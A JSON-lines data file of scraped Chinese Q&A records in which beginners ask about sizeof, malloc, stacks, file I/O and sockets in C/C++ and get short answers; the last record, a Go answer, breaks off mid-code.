{"Answer": "&lt;p&gt;sizeof&amp;#xff08;n&amp;#xff09;就是变量n占用的内存byte数&lt;br /&gt;int型应该是4&lt;br /&gt;至于为什么乘以2&amp;#xff0c;c又代表什么&amp;#xff0c;你这代码也不全&amp;#xff0c;题目也没放全&amp;#xff0c;确实猜不到&lt;br /&gt;while(bit--&amp;gt;0)&lt;br /&gt;千万别把--&amp;gt;理解成箭头&amp;#xff0c;那就掉沟里了&lt;br /&gt;bit--是一个表达式&amp;#xff0c;0是另一个表达式&amp;#xff0c;就是在判断左边是否大于右边&amp;#xff0c;大于就循环&amp;#xff0c;不大于就停止循环&lt;br /&gt;n&amp;gt;&amp;gt;bit就是n右移bit位&amp;#xff0c;&amp;amp;1就是跟1做与运算&lt;br /&gt;那么整个的效果就是先把第0位跟1与&amp;#xff0c;输出0或者1&amp;#xff1b;然后右移之后&amp;#xff0c;第1位跑到第0位去了&amp;#xff0c;相当于把第1位跟1与&amp;#xff0c;输出0或者1&amp;#xff1b;然后继续移位&amp;#xff0c;继续与&amp;#xff0c;这样输出每一位&lt;br /&gt;但是这明显跟题目要求不符啊&amp;#xff0c;不是从高到低的输出吗&amp;#xff0c;现在是从低到高输出的&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof用法的问题", ["题目要求是输入一个数 输出它在内存中存储的二进制数。就是我找了这个代码但是没学过有点看不懂，希望会的人帮帮忙"]], "Tag": "程序设计"}
{"Answer": "```\r\nint main(){\r\n    struct Stack *S;\r\n    SetNullS(S);    //初始化\r\n```\r\n\r\n这里就已经错了，S没有初始化。\r\n你是不是应该写成：\r\nstruct Statck s;\r\nSetNullS(&amp;S);", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求助大佬，C++进行栈操作，是哪里出了问题", ["代码如下", "\n\n", "#include<iostream>\n#include<stdlib.h>\n#include<conio.h>\nusing namespace std;\n#define maxsize 100\n\n//定义栈的结构体 \ntypedef int datatype; \nstruct Stack{\n    datatype elements[maxsize];\n    int Top;\n}; \n\n//对栈初始化\nstruct Stack *SetNullS(struct Stack *S){\n    S->Top=-1;\n    return S;\n} \n\n//判断栈是否为空(出栈时)\nint EmptyS(struct Stack *S){\n    if(S->Top>=0) return 0;\n    else return 1;\n} \n\n//进栈，需要判断是否栈满 \nstruct Stack *PushStackS(struct Stack *S,datatype e){\n    if(S->Top>=maxsize-1){  //数组从0开始 \n        cout<<\"溢出\"<<endl;\n        return NULL;\n    }\n    else{\n        S->Top++;\n        S->elements[S->Top]=e;\n    }\n    return S;\n}\n\n//出栈，需要判断是否栈空，并返回栈顶元素 \n datatype *PopS(struct Stack *S){\n    datatype *ret; \n     if(EmptyS(S)){\n        cout<<\"栈为空\"<<endl;\n         return NULL; \n     }\n    else{\n        S->Top--;   //删除栈顶数据元素 \n        ret=(datatype *)malloc(sizeof(datatype));\n        *ret=S->elements[S->Top+1];\n        return ret; \n    }\n }\n\n//取栈顶元素（仅取值）\ndatatype *GetTopS(struct Stack *S){\n    datatype *ret;\n    if(EmptyS(S)){\n        cout<<\"栈是空的\"<<endl;\n        return NULL;\n    } \n    else{\n        ret=(datatype *)malloc(sizeof(datatype));\n        *ret=S->elements[S->Top];\n        return ret; \n    }\n} \n\nint main(){\n    struct Stack *S;\n    SetNullS(S);    //初始化\n    datatype e;\n    while((e=getche())!='#')    //入栈 \n    {\n        PushStackS(S,e);\n    }\n    cout<<endl;\n    datatype *x=GetTopS(S); //取栈顶元素 \n    cout<<x<<endl;      \n    PopS(S);        //出栈 \n    datatype *y=GetTopS(S); //取栈顶元素 \n    cout<<y<<endl;\n    return 0;   \n}\n", "\n\n", "最后输出的应该是数值的，结果输出了地址，为什么？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;用*p和p[ ]作为形参传递数组&amp;#xff0c;两者没有区别&amp;#xff0c;数组的大小只能用形参传入。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["向函数中传递数组时，用*p和p[ ]作为形参有什么区别？还有数组传递给了函数以后要怎么样计算数组的大小呢，用sizeof（p）提示只能计算指针的大小？", ["向函数中传递数组时，用*p和p[ ]作为形参有什么区别？还有数组传递给了函数以后要怎么样在函数内部计算数组的大小呢，用sizeof（p）提示只能计算指针的大小？  "]], "Tag": "程序设计"}
{"Answer": "```\r\n(CSeries)m_chart1.Series(0).Delete(0);\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["TeeChart AddXY() 描点 所增加的内存如何释放？", ["1.TeeChart AddXY() 描点 所增加的内存如何释放？", "\n\n", "2.", "\n\n", "while (!rs.IsEOF())\n                    {\n                        for (int i = 0; i < sizeof(fieldNamee) / sizeof(char*); ++i)\n                        {\n                            short index = rs.GetFieldIndexByName(fieldNamee[i]);\n                            rs.GetFieldValue(index, value);\n                            double douValue = atof(value.GetBuffer());                  //CString 强转成 double\n\n                            switch (i)\n                            {\n                            case 0:\n                                ((CSeries)m_chart1.Series(nline0)).AddXY(s_x, douValue, nowTime, RGB(0, 0, 0));         //AddXY(x, y, x_str, RGB)\n                                m++;\n                                printf(\"描点次数为：%d \\n\", m);\n                                break;\n                            case 1:\n                                ((CSeries)m_chart1.Series(nline1)).AddXY(s_x, douValue, nowTime, RGB(255, 0, 0));\n                                break;\n                            case 2:\n                                ((CSeries)m_chart1.Series(nline2)).AddXY(s_x, douValue, nowTime, RGB(46, 139, 87));\n                                break;\n                            case 3:\n                                ((CSeries)m_chart1.Series(nline3)).AddXY(s_x, douValue, nowTime, RGB(0, 0, 255));\n                                break;\n                            case 4:\n                                ((CSeries)m_chart1.Series(nline4)).AddXY(s_x, douValue, nowTime, RGB(205, 92, 92));\n                                break;\n                            case 5:\n                                ((CSeries)m_chart1.Series(nline5)).AddXY(s_x, douValue, nowTime, RGB(255, 185, 15));\n                                break;\n                            default:\n                                break;\n                            }\n"]], "Tag": "程序设计"}
{"Answer": "确定你的iofile.write((char )&amp;work[i], sizeof(work[i]));是对的？\r\n而不是iofile.write((char *)&amp;work[i], sizeof(work[i])); ?", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求大神赐教，关于文件读写，fun1正常fun2就会输出乱码", ["#define _CRT_SECURE_NO_WARNINGS", "\n#include ", "\n#include ", "\n#include ", "\n#include ", "\nusing namespace std;", "\nclass Worker", "\n{", "\npublic:", "\n    int num;", "\n    char name[20];", "\n    int age;", "\n    int wage;", "\n};", "\nWorker  work[5] = { 12, \"Zhang\", 22, 10000, 4, \"Li\", 23, 1000, 2, \"Fan\", 52, 100, 8, \"Wu\", 24, 10, 6, \"Ha\", 28, 12000 };", "\nvoid swap(Worker worker[], int i, int j)", "\n{", "\n    int temp1, temp2, temp3;", "\n    char temp4[20];", "\n    temp1 = worker[i].num;", "\n    temp2 = worker[i].age;", "\n    temp3 = worker[i].wage;", "\n    strcpy(temp4, worker[i].name);", "\n    worker[i].num = worker[j].num;", "\n    worker[i].age = worker[j].age;", "\n    worker[i].wage = worker[j].wage;", "\n    strcpy(worker[i].name, worker[j].name);", "\n    worker[j].num = temp1;", "\n    worker[j].age = temp2;", "\n    worker[j].wage = temp3;", "\n    strcpy(worker[j].name, temp4);", "\n\n", "}", "\nvoid fun1()  //将5个工人数据写入到文件，fun1函数正常", "\n{", "\n    ofstream outfile(\"work.txt\", ios::out);", "\n    if (!outfile)", "\n    {", "\n        cerr << \"open error!\" << endl;", "\n        abort();", "\n    }", "\n    outfile.close();", "\n    fstream iofile(\"work.txt\", ios::out | ios::in | ios::binary);", "\n    if (!iofile)", "\n    {", "\n        cerr << \"open error!\" << endl;", "\n        abort();", "\n    }", "\n    for (int i = 0; i < 4; i++)", "\n    {", "\n        for (int j = i; j < 4; j++)", "\n        {", "\n            if (work[i].num > work[j + 1].num)", "\n            {", "\n                swap(work, i, j);", "\n            }", "\n        }", "\n    }", "\n    for (int i = 0; i < 5; i++)", "\n    {", "\n        iofile.write((char ", ")&work[i], sizeof(work[i]));", "\n        iofile.seekg(i*sizeof(work[i]), ios::beg);", "\n        iofile.read((char *)&work[i], sizeof(work[i]));", "\n        cout << work[i].num << \" \" << work[i].name << \" \" << work[i].age << \" \" << work[i].wage << endl;", "\n    }", "\n    iofile.close();", "\n}", "\nvoid fun2()//输出乱码，为什么", "\n{", "\n    ofstream outfile(\"work.txt\", ios::app|ios::binary);", "\n    if (!outfile)", "\n    {", "\n        cerr << \"open error!\" << endl;", "\n        abort();", "\n    }", "\n    Worker  worker[2] = { 101, \"Lin\", 72, 10800, 104, \"Ka\", 29, 10020 };", "\n    for (int i = 0; i < 2; i++)", "\n    {", "\n        outfile.write((char", ")&worker[i], sizeof(worker[i]));", "\n    }", "\n    outfile.close();", "\n    Worker all_work[7];", "\n    ifstream infile(\"work.txt\", ios::in|ios::binary);", "\n    if (!infile)", "\n    {", "\n        cerr << \"open error!\" << endl;", "\n        abort();", "\n    }", "\n    for (int i = 0; i < 7; i++)", "\n    {", "\n        infile.seekg(i*sizeof(all_work[i]), ios::beg);", "\n        infile.read((char*)&all_work[i], sizeof(all_work[i]));", "\n        cout << all_work[i].num << \" \" << all_work[i].name << \" \" << all_work[i].age << \" \" << all_work[i].wage << endl;", "\n    }", "\n    infile.close();", "\n}", "\nvoid main()", "\n{", "\n    fun1();", "\n    fun2();", "\n    system(\"pause\");", "\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;char的大小固定是1字节&amp;#xff0c;short是2字节&amp;#xff0c;long是4字节&amp;#xff08;long int&amp;#xff0c;如果是long long就是8字节&amp;#xff09;则sizeof(A)是1&amp;#43;1&amp;#43;2&amp;#43;4&amp;#61;8&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问一道sizeof有关的题目", ["1.char t后的冒号有什么作用?", "2.为什么sizeof（A）＝8而不是等于4*4＝16", "谢谢解答"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;传入函数的是指针,指针本身不带长度信息,这个没什么问题&lt;br /&gt;在main中直接打印的话,因为你使用了初始化器&lt;br /&gt;这是在main中数组长度会由初始化器长度决定&lt;br /&gt;而同一个函数内部直接看到的是一个int[3],是带长度的&lt;br /&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/653268286136112.png\" width=\"600px\" align=\"left\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言中关于sizeof的结果?", ["64位环境中为什么使用两种方式得到的结果不一致? 见代码", "\n", "#", "include", " ", "<stdio.h>", "\n\n", "void", " ", "arrayLength", "(", "int", " numbers[])", ";\n\n", "int", " ", "main", "()", " ", "{\n    ", "int", " numbers[] = {", "1", ", ", "2", ", ", "3", "};\n    ", "printf", "(", "\"size of numbers: %llu\\n\"", ", ", "sizeof", "(numbers)); ", "// 12, 这里的numbers是指针, sizeof是如何知道其有多少个元素的?", "\n    ", "arrayLength", "(numbers);\n    ", "return", " ", "0", ";\n}\n\n", "void", " ", "arrayLength", "(", "int", " numbers[])", " ", "{\n    ", "printf", "(", "\"size of numbers: %llu\\n\"", ", ", "sizeof", "(numbers)); ", "// 8, 这里的结果为什么与main中得到的结果不一致? 这里的numbers也是指针啊,而且地址跟main中的一样", "\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "https://blog.csdn.net/antiquedwr/article/details/50521623", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于realloc()使用的问题", ["#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n\ntypedef struct HString {\n    char *ch=NULL;  //需要初始化\n    int length=0;\n}HString;\n\nvoid hsAssign(HString &T,char s[]) {\n    if (T.ch)\n        free(T.ch);\n    T.ch = (char*)malloc(sizeof(char));\n    if (!T.ch) {\n        printf(\"Fail to create the string.\");\n        return;\n    }\n    T.length = strlen(s);\n    for (int i = 0; i < strlen(s); i++)\n        T.ch[i] = s[i];\n}\n\nint hsCompare(HString T, HString S) {\n    //若S>T，则返回值>0\n    for (int i = 0; i < T.length&&i < S.length; i++)\n        if (T.ch[i] != S.ch[i]) \n            return S.ch[i] - T.ch[i];  //返回的是ASCII码的差\n    return S.length - T.length;\n}\n\nint hsClear(HString &T) {\n    free(T.ch);\n    T.ch = NULL;\n    T.length = 0;\n    return 1;//确认清空串操作是否成功\n}\n\nvoid hsConcat(HString &con, HString T, HString S) {\n    if (con.ch)\n        free(con.ch);\n    con.ch = (char*)malloc(sizeof(char));//确保con被分配了新的存储空间\n    for (int i = 0; i < T.length; i++)\n        con.ch[i] = T.ch[i];\n    for (int i = T.length; i < T.length +  S.length; i++)\n        con.ch[i] = S.ch[i - T.length];\n    con.length = T.length + S.length;\n}\n\nvoid hsSub(HString &sub, HString T, int pos, int len){\n    if (pos -1> T.length || pos <= 0 || pos + len -1> T.length || len < 0) {\n        printf(\"Wrong input.\");\n        return;\n    }\n    int count = 0;\n    if (sub.ch)\n        free(sub.ch);\n    sub.ch = (char*)malloc(sizeof(char));\n    for (int i = pos - 1; i <=pos + len - 2; i++)\n        sub.ch[count++] = T.ch[i];\n    sub.length = len;\n}\n\nvoid hsInsert(HString &S, int pos, HString T) {\n    int count = 0;\n    if (pos <= 0 || pos - 1 > S.length) {\n        printf(\"Wrong input\");\n        return;\n    }\n    for (int i = S.length - 1; i >= pos - 1; i--)\n        S.ch[i + T.length] = S.ch[i];\n    for (int i = pos - 1; i <= pos + T.length - 2; i++)\n        S.ch[i] = T.ch[count++];\n    S.length += T.length;\n}\n\nvoid hsPrint(HString T) {\n    for(int i=0;i<T.length;i++)\n        printf(\"%c\", T.ch[i]);\n}\n\nint main() {\n    HString T, S1,S2;\n    char s[20];\n    scanf_s(\"%s\", s, 20);\n    hsAssign(S1, s);\n    scanf_s(\"%s\", s, 20);\n    hsAssign(S2, s);\n    hsInsert(S1, 2, S2);\n    hsPrint(S1);\n    return 0;\n} \n", "\n\n", "在hsInsert()函数中如果使用了S.ch=(char*)realloc(S.ch,(T.length+S.length)*sizoef(char));", "\n结果是tTEST", "\n而如果不用realloc()函数 结果是tTESTest", "\n请问这是为什么？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;那肯定是内存泄露了&lt;br /&gt;1 走读代码&amp;#xff0c;检查哪里有未释放的内存&lt;br /&gt;2 不好检查的话&amp;#xff0c;WINDBG DEBUG调试&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["mfc 定时多线程运行一段时间后 内存满了", ["mfc 定时多线程运行一段时间后 内存满了，是哪里出现问题了？怎么弄 ", "\n", "\n", "\n", "SYSTEMTIME st;GetLocalTime(&st);", "    DWORD CurrentTime,jisuanTime = 0, huanhang = 0, huanhangjisu = 0, val = 0;", "    DWORD hang[100], hangshu = 0;", "    CString l_str1, l_str3, code, longcode;", "    CurrentTime = st.wHour * 60 * 60 + st.wMinute * 60 + st.wSecond;", "    int l_int = ", "(int ", ")Context;", "    HWND l_hwnd;RECT rctA; HDC g_memDc; HDC disDc;", "    l_hwnd = All_hwnd[l_int];", "    shibieCode shibie;", "    SaveSymGuocheng savesymguocheng;", "    savesymguocheng.线程 = l_int;", "    ::GetWindowRect(l_hwnd, &rctA);", "    int src_x = rctA.right - rctA.left;", "    int src_y = rctA.bottom - rctA.top + 2;", "    disDc = ::GetWindowDC(l_hwnd);", "    g_memDc = CreateCompatibleDC(disDc);", "    HBITMAP hbitMap = CreateCompatibleBitmap(disDc, src_x, src_y);", "    SelectObject(g_memDc, hbitMap);", "    BitBlt(g_memDc, 0, 0, src_x, src_y, disDc, 0, 0, SRCCOPY);", "    BITMAP bmpInfo;", "    LPBYTE lpOrigiPixel = NULL;", "    DWORD dwOigiPixelLen = 0;", "    memset(&bmpInfo, 0, sizeof(BITMAP));", "    GetObjectA(hbitMap, sizeof(BITMAP), &bmpInfo);", "    dwOigiPixelLen = bmpInfo.bmWidth", "bmpInfo.bmHeight * 4;", "    DWORD dwPixels = bmpInfo.bmWidth", "bmpInfo.bmHeight;", "    lpOrigiPixel = new BYTE[dwOigiPixelLen];", "    GetBitmapBits(hbitMap, dwOigiPixelLen, lpOrigiPixel);", "    DWORD l_kaishihang = 0;", "    ReleaseDC(l_hwnd, disDc);", "    ReleaseDC(l_hwnd, g_memDc);", "    DeleteObject(hbitMap);", "    delete[]lpOrigiPixel;", "    Sleep(10);", "    return;"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;num是个数&amp;#xff0c;sizeof(int)是取int型数据的大小&amp;#xff0c;乘起来就是开辟四个int大小的内存。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["ptr = (int*)malloc(num * sizeof(int))这个num*sizeof（int）是什么意思", ["C语言申请内存的一些问题：ptr = (int*)malloc(num * sizeof(int))这个num*sizeof（int）是什么意思", "\n", "#include <stdio.h>", "#include <stdlib.h>", "\n", "int main(void)", "{", "    int* ptr = NULL;", "    int num, i;", "    printf(\"请输入待录入的整数的个数:\");", "    scanf_s(\"%d\", &num);", "    ", "ptr = (int", ")malloc(num * sizeof(int));", "*", "    for (i = 0; i < num; i++)", "    {", "        printf(\"请录入第%d个整数\", i + 1);", "        scanf_s(\"%d\\n\", &ptr[i]);", "\n", "}\n", "printf", "(", "\"你录入的整数是:\"", ");\n", "for", " (i = ", "0", "; i < num; i++)\n{\n    ", "printf", "(", "\"%d\\n\"", ", ptr[i]);\n}\n", "putchar", "(", "'\\n'", ");\n", "free", "(ptr);\n\n", "return", " ", "0", ";\n", "\n", "}", "还有为什么我输入第一个数还要再输一个按enter才可以"]], "Tag": "程序设计"}
{"Answer": "照你这样说肯定不会动，因为你只开启了服务器，而没有开启客户端，并且你的accept函数可以接受一个连接阻塞，直到对方存在，如果没有连接上等待队列现在，套接字是阻塞显着。那么你的客户端没有连接的话。。。断点肯定是进不去的呀！！！\r\n![图片说明](https://img-ask.csdn.net/upload/201512/03/1449127519_252642.png)", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["有没有socket高手来救救我，快哭了，小弟在此谢过，", ["BOOL Cmain::OnInitDialog()", "\n{", "\n    CDialogEx::OnInitDialog();", "\n\n", "// TODO:  在此添加额外的初始化\nconst int BUF_SIZE = 64;\nWSADATA         wsd;            //WSADATA变量  \nSOCKET          sServer;        //服务器套接字  \nSOCKET          sClient;        //客户端套接字  \nSOCKADDR_IN     addrServ;;      //服务器地址  \nchar            buf[BUF_SIZE];  //接收数据缓冲区  \nchar            sendBuf[BUF_SIZE];//返回给客户端得数据  \nint             retVal;         //返回值  \n//初始化套结字动态库  \nif (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)\n{\n    AfxMessageBox(L\"WSAStartup failed!\");\n    return 1;\n}\n\n//创建套接字  \nsServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\nif (INVALID_SOCKET == sServer)\n{\n    AfxMessageBox(L\"socket failed!\");\n    WSACleanup();//释放套接字资源;  \n    return  -1;\n}\n\n//服务器套接字地址   \naddrServ.sin_family = AF_INET;\naddrServ.sin_port = htons(8088);\naddrServ.sin_addr.s_addr = INADDR_ANY;\n//绑定套接字  \nretVal = bind(sServer, (LPSOCKADDR)&addrServ, sizeof(SOCKADDR_IN));\nif (SOCKET_ERROR == retVal)\n{\n    AfxMessageBox(L\"bind failed!\");\n    closesocket(sServer);   //关闭套接字  \n    WSACleanup();           //释放套接字资源;  \n    return -1;\n}\n\n//开始监听   \nretVal = listen(sServer, 1);\nif (SOCKET_ERROR == retVal)\n{\n    AfxMessageBox(L\"listen failed!\");\n    closesocket(sServer);   //关闭套接字  \n    WSACleanup();           //释放套接字资源;  \n    return -1;\n}\n\n//接受客户端请求  \nsockaddr_in addrClient;\nint addrClientlen = sizeof(addrClient);\nsClient = accept(sServer, (sockaddr FAR*)&addrClient, &addrClientlen);\nif (INVALID_SOCKET == sClient)\n{\n    AfxMessageBox(L\"accept failed!\");\n    closesocket(sServer);   //关闭套接字  \n    WSACleanup();           //释放套接字资源;  \n    return -1;\n}\n\nwhile (true)\n{\n    //接收客户端数据  \n    ZeroMemory(buf, BUF_SIZE);\n    retVal = recv(sClient, buf, BUF_SIZE, 0);\n    if (SOCKET_ERROR == retVal)\n    {\n        AfxMessageBox(L\"recv failed!\");\n        closesocket(sServer);   //关闭套接字  \n        closesocket(sClient);   //关闭套接字       \n        WSACleanup();           //释放套接字资源;  \n        return -1;\n    }\n    if (buf[0] == '0')\n        break;\n        为什么在    “sClient = accept(sServer, (sockaddr FAR*)&addrClient, &addrClientlen);”就停着不动了啊？怎么改呢？\n"]], "Tag": "程序设计"}
{"Answer": "有两处严重的错误：\r\n@1：text = (text == NULL) ? \"\" : text; 如果text为null，text会指向一个字符串常量，释放时候必崩溃\r\n@2：long size = (fseek(f, 0L, SEEK_END) != 0) ? (ftell(f)) : -1; 此处逻辑错误，long size = (fseek(f, 0L, SEEK_END) == 0) ? (ftell(f)) : -1;才正确", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C程序内存不能为read错误，包含文件和内存操作", ["各个方法每个都没问题，放一块儿就冒出个不明原因的错误", "\n\n", "#include <stdio.h>\n#include <math.h>\n#include <time.h>\n\n//get time difference\n//days from 2015/6/9 to here.\nint getTD();\n//free()!\nchar* getTextFileContent(char*);\nlong getFileSize(FILE*);\n//free()!\nchar* mStrCat(char*, char*);\n\nint main()\n{\n    int TD = getTD() + 1;\n\n    char buf[100];\n    getcwd(buf, 100);\n\n    char *listPath = mStrCat(buf, \"\\\\plan.txt\");\n    //DEBUG\n    printf(\"%s\\r\\n\", listPath);\n\n    char* text = getTextFileContent(listPath);\n    free(listPath);\n    printf(\"%s\", text);\n    text = (text == NULL) ? \"\" : text;\n\n    system(\"cls\");\n    printf(\"高考后第[ %d ]天\\r\\n\", TD);\n    printf(\"Tasks:\\r\\n %s\\r\\n\", text);\n    system(\"pause & exit\");\n\n    free(text);\n\n    return 0;\n}\n\nint getTD()\n{\n    struct tm tmptm = {0, 0, 0, 9, 5, 2015 - 1900};\n    long startT = mktime(&tmptm);\n    long nowT = time(NULL);\n    //seconds\n    long TDs = nowT - startT;\n    //days\n    double TDd = (double)TDs;\n    TDd = TDd / (60 * 60 * 24);\n    TDd = floor(TDd);\n    return (int)TDd;\n}\n\nchar* getTextFileContent(char *path)\n{\n    FILE *fp = fopen(path, \"r\");\n    if(fp == NULL) \n        return NULL;\n    long size = getFileSize(fp);\n    int chLen = sizeof('\\0');\n    char *ptr = (char*)malloc(size + chLen);\n    //block 作为这块内存区的起始指针将被作为字符串指针返回，ptr 经过运算后将指向内存区结尾。\n    char *block = ptr;\n    if(ptr == NULL)\n    {\n        return NULL;\n    }\n\n    int c;\n    char ch;\n    //依次将fgetc 获得的字符填入内存区。\n    while((c = fgetc(fp)) != EOF)\n    {\n        ch = (char) c;\n        memcpy(ptr, &ch, chLen);\n        //移动ptr 到下一个待填入的地址。\n        (int)ptr += chLen;\n    }\n    char endC = '\\0';\n    memcpy(ptr, &endC, chLen);\n\n    return block;   \n}\n\nlong getFileSize(FILE* f)\n{\n    long size = (fseek(f, 0L, SEEK_END) != 0) ? (ftell(f)) : -1;\n    rewind(f);\n\n    return size;\n}\n\nchar* mStrCat(char *str1, char *str2)\n{\n    int str1Len = strlen(str1) + 1;\n    int str2Len = strlen(str2) + 1;\n    int byteNum = (str1Len + str2Len - 1) * sizeof(char);\n    char *block = (char*)(malloc(byteNum));\n    if(block == NULL)\n        return NULL;\n\n    memmove(block, str1, str1Len * sizeof(char));\n    strcat(block, str2);\n\n    return block;\n}\n", "\n\n", "文件内容可以正常输出，说明文件读取的部分大概没问题，mStrCat 经测试也没发现问题，但程序死活执行不到 system(\"cls\") ，一到这儿Windows就会弹窗提示。", "\n\n", "文件内容可以正常输出：", "\n\n", "另外，运行程序的时候360报毒了，一个QVM。。。，然后运行几次之后那个cmd窗口无法关闭了（点什么都没反映，但光标在闪）。打开的任务管理器也变成了这样：", "\n自然，没能杀掉cmd，最后连资源管理器都不正常了，通过重启解决。（一个小练习而已杀伤力没这么大吧）", "\n\n", "P.S. 通过TCC 编译", "\n\n", "改动后的getTextFileContent 代码：（实际上没什么改动，但至少能用了）", "\n\n", " char* getTextFileContent(char *path)\n{\n    FILE *fp = fopen(path, \"r\");\n    if(fp == NULL) \n        return NULL;\n\n    long size = getFileSize(fp);\n\n    int chLen = sizeof(char);\n    char *ptr = (char*)malloc(size + chLen);\n    char *block = ptr;\n    if(ptr == NULL)\n    {\n        return NULL;\n    }\n\n    int c;\n    char ch;\n    while((c = fgetc(fp)) != EOF)\n    {\n        ch = (char)c;\n        memcpy(ptr, &ch, chLen);\n        ptr += chLen;\n    }\n    ch = '\\0';\n    memcpy(ptr, &ch, chLen);\n\n    fclose(fp);\n    return block;\n}\n", "\n\n", "文件大小为275b 时读取汉字都没问题（I don't know why ...），但到1.27k（全英文）时就又冒出了内存不能为written 错误，一瞬间想到当初在Android 上写的个文件复制程序会不时的冒出Segmentation Fault……", "\n\n", "哪位大神来搭救一下！"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;万变不离其宗&lt;br /&gt;sizeof无非就是对单个变量和数组&amp;#xff08;不能是函数调用中&amp;#xff09;&lt;br /&gt;后面你那个&amp;gt;&amp;gt;1就是/2的意思。&lt;br /&gt;[n][n&amp;#43;1] 是 n*n&amp;#43;1&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof()能有多少种用法？", ["sizeof()能有多少种用法？", "\n", "例如：", "求n*(n+1)/2", "\n", "bool arr[n][n+1];", "return sizeof(arr)>>1;"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;malloc失败&amp;#xff0c;说明没有可用内存了&amp;#xff0c;data[n]的数据是否太大&amp;#xff0c;超出了电脑的硬件限制呢&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["for循环中使用了200次malloc分配内存，在第十次后都分配失败了？", ["\n", "int simNetSetUp(void)\n{\n    int i = 0, j = 0, k = 0, n = 0;\n    //神经网络层数\n    layer_all1 = (int)data[n];\n    n++;\n\n    //神经网络每层节点数\n    nodes_all1 = (int*)malloc(sizeof(int) * layer_all1);\n    for (i = 0; i < layer_all1; i++)\n    {\n        nodes_all1[i] = data[n];\n        n++;\n    }\n    //申请层数\n    simnetwork = (struct simnetnode**)malloc(sizeof(struct simnetnode*) * (layer_all1));\n    if(NULL==simnetwork)\n    {\n        printf(\"simnetwork分配内存失败\");\n    }\n    //初始分配成功\n    //申请神经网络每层节点\n    \n    for (i = 0; i < layer_all1; i++)\n    {\n        simnetwork[i] = (struct simnetnode*)malloc(sizeof(struct simnetnode) * nodes_all1[i]);    //分配成功\n    }\n\n    //映射参数\n    for (i = 0; i < SIMROW_X; i++)\n    {\n        simxminmax[i][0] = data[n];\n        n++;\n        simxminmax[i][1] = data[n];\n        n++;\n\n    }\n    for (i = 0; i < SIMROW_Y; i++)\n    {\n        simyminmax[i][0] = data[n];\n        n++;\n        simyminmax[i][1] = data[n];\n        n++;\n    }\n    //神经网络节点参数初始化\n    for (i = 0; i < layer_all1; i++)\n    {\n        for (j = 0; j < nodes_all1[i]; j++)\n        {\n            if (i != layer_all1 - 1)\n            {\n            simnetwork[i][j].w = (double*)malloc(sizeof(double)* nodes_all1[i+1]);\n                //分配内存失败\n                if(NULL==simnetwork[i][j].w)\n                {\n                    printf(\"权重分配内存失败\");\n                //    number++;\n                    //printf(\"number%.4d=\",number);\n                    //201次分配内存有191次分配失败\n                }\n                for (k = 0; k < nodes_all1[i+1]; k++)\n                {\n                simnetwork[i][j].w[k] = data[n];\n                    n++;\n                }\n                simnetwork[i][j].b = data[n];\n                n++;\n                //printf(\"%d\\n\",n);\n            }\n        }\n    }\n    \n    return 0;\n\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;没问题&amp;#xff0c;你也可以使用%zd的转换格式。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["刚接触c语言想问一下这么写对吗", ["编写程序，输出short, int, long, float, double, char等类型变量所占的存储空间大小", "\n", "#include<stdio.h>", "\n", "int main()", "\n", "{", "\n", "printf", "(", "\"short%d\\n\"", ",sizeof(short));\n\n", "printf", "(", "\"int%d\\n\"", ",sizeof(", "int", "));\n\n", "printf", "(", "\"long%d\\n\"", ",sizeof(long));\n\n", "printf", "(", "\"float%d\\n\"", ",sizeof(float));\n\n", "printf", "(", "\"double %d\\n\"", ",sizeof(double ));\n\n", "printf", "(", "\"char%d\\n\"", ",sizeof(char));\n\n", "return", " ", "0", ";\n", "\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;First, you need to provide an error free example. Let's start with the basic numbers. For example,&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;package main\n\nimport (\n    \"fmt\"\n    \"runtime\"\n    \"unsafe\"\n)\n\nfunc WriteMatrix(nm [][]int64) {\n    for n := range nm {\n        for m := range nm[n] {\n            nm[n][m]++\n        }\n    }\n}\n\nfunc NewMatrix(n, m int) [][]int64 {\n    a := make([]int64, n*m)\n    nm := make([][]int64, n)\n    lo, hi := 0, m\n    for i := range nm {\n        nm[i] = a[lo:hi:hi]\n        lo, hi = hi, hi+m\n    }\n    return nm\n}\n\nfunc MatrixSize(nm [][]int64) int64 {\n    size := int64(0)\n    for i := range nm {\n        size += int64(unsafe.Sizeof(nm[i]))\n        for j := range nm[i] {\n            size += int64(unsafe.Sizeof(nm[i][j]))\n        }\n    }\n    return size\n}\n\nvar nm [][]int64\n\nfunc main() {\n    n, m := 1&amp;lt;&amp;lt;15, 